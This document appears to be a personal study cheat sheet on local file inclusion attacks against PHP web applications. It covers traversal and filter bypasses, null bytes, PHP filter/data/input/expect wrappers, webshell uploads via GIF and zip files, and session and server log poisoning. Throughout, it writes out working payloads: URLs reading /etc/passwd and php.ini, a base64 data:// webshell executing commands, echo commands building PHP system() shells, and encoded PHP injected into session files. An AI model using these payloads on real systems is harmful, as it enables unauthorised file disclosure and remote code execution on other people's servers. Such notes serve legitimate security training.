File inclusions

Enum:
|
|--- file inclusions happens when theres no defence mechanisms like sanitization or WAF present
|
|--- often these vulns are found in template engines
|
|--- 'bookstore.com/search.php?books=/etc/passwd' or 'books=/C:\Windows\boot.ini'
|
|--- the above doesn't always work, so try '../' or '/../'

Second order:
|
|--- incorrectly pulling files from the back end server
|
|--- name a file that matches the file on the server
 \
  --- sign up with username '/etc/passwd' 
  |
  |--- download your pfp 
  |
  |--- the server will garb the local file 

Non recursive:
|
|--- a common but insecure to protect againts lfi is to remove the substr <- '/../../../'
|
|--- to move around this <- '//....//....//....//'
|
|--- can also do '..././' and '....\/'

Encoding:
| 
|--- it is common for a webapp  to filter out charecters like '.' and '/'
|
|--- so encode them
|
|--- %2e%2e%2f <- ../
|
|--- can also double encode if needed

Approved:
|
|--- certain web apps would only allow paths under a certain directory
|
|--- bookstore.com/search.php?books=Fiction/../../../../etc/passwd
|
|--- might to combine both techniques to work

Obsolete technique:
|
|--- try these if the php version is 5.3/5.4
|
\
 Path truncation:
 |
 |--- in php, strings had a max of 4096 charecters due to 32-bit systems
 |
 |--- any value past that would get truncated
 |
 |--- ../../../etc/passwd/../..[etc...]
 
 Null bytes:
 |
 |--- in versions before 5.5, we could add an null byte(%00)
 |
 |--- this would terminate the string and will not consider anything after
 |
 |--- /etc/passwd%00 or /ect/passwd%00.php if needed

Input filters:
|
|--- wrappers allow us to access I/O streams, file descriptors, memory streams
|
|--- php filters are a type of wrapper where input can be filtered
|
|--- use the 'php://' to use the wrapper and 'php://filter' to access the filter wrapper
|
|--- php://filter/read=convert.base64-encode/resource=config
|
|--- the filtere wrapper has a handful of parameters, but resource and read are the main focus
|
|--- the resource param is required and it is for filter wrappers
|
|--- we can specify the stream we can apply on the filter(like a local file for instace)
|
|--- the read param can apply diffrent filters on the input resource
|
|--- most useful filter is the base64 conversion filter

Data wrapper:
|
|--- this wrapper is used to include external data like php code
|
|--- the 'allow_url_include' needs to be enabled
|
|--- to check if its enabled
|
|--- apache: /etc/php/<php.version>/apache2/php.ini <- depending on the target the ext may not be needed
|
|--- nginx: /etc/php/<php.version>/fpm/php.ini
|
|--- try earlier version of php if we cant locate the cofig file
|
|--- use the base64 filter to avoid breaking
|
|--- /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
|
|--- after that we can perform code execution
|
|--- /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

Input wrapper:
|
|--- like the data wrapper, but the difference is the input passed to the wrapper as a post request
|
|--- meaning that a param must accept a post request
|
|--- this wrapper also has 'allow_url_include'

Expect wrapper:
|
|--- with this wrapper we can run commands up front through url streams
|
|--- this is an external wrapper and needs to be installed on the backend
|
|--- can use the 'expect://' scheme and pass commands

File Upload:
|
|--- craft it, 'echo GIF8<?php system($_GET["cmd"]); ?>' > shell.gif <- use any file ext needed 
|
|--- needs to be combine with a lfi, otherwise its harmless
|
|--- to include the uploaded file, we need the path to our file
|
|--- can be done with inspect element 

Zip Upload:
|
|--- the zip wrapper can execute php code
|
|--- not enabled by default
|
|--- echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
|
|--- the upload function may still dectect it as a zip archive
|
|--- try messing with the Content-Type header

Log Poisoning:
|
|--- PHPSESSID holds user related data in the backend
|
|--- in linux they are stored '/var/lib/php/sessions'
|
|--- in windows 'C:\Windows\Temp'
|
|--- has a 'sess_' prefix at the begining
|
|--- try changing the value of the param that we have control over 
|
|--- /index.php?language=sess_posioning
|
|--- after confirming that we have control, input php code
|
|--- /index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E <- url encoding may or may not be needed
|
|--- after doing so
|
|--- /index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

Server Log Posioning:
|
|--- access.log contains diverse info about request made to the server
|
|--- includes the User_Agent header
|
|--- this header can be controlled in our requests
|
|--- nginx can read logs at lower privleges then apache
|
|--- old or miscofigurtions of the apache web server can be read at lower privleges
|
|--- apache logs: /var/log/apache2/{log file here}
|
|--- nginx logs: /var/log/nginx/
|
|--- apache logs: C:\xampp\apache\logs\{log file here}
|
|--- nginx logs: C:\nginx\logs\
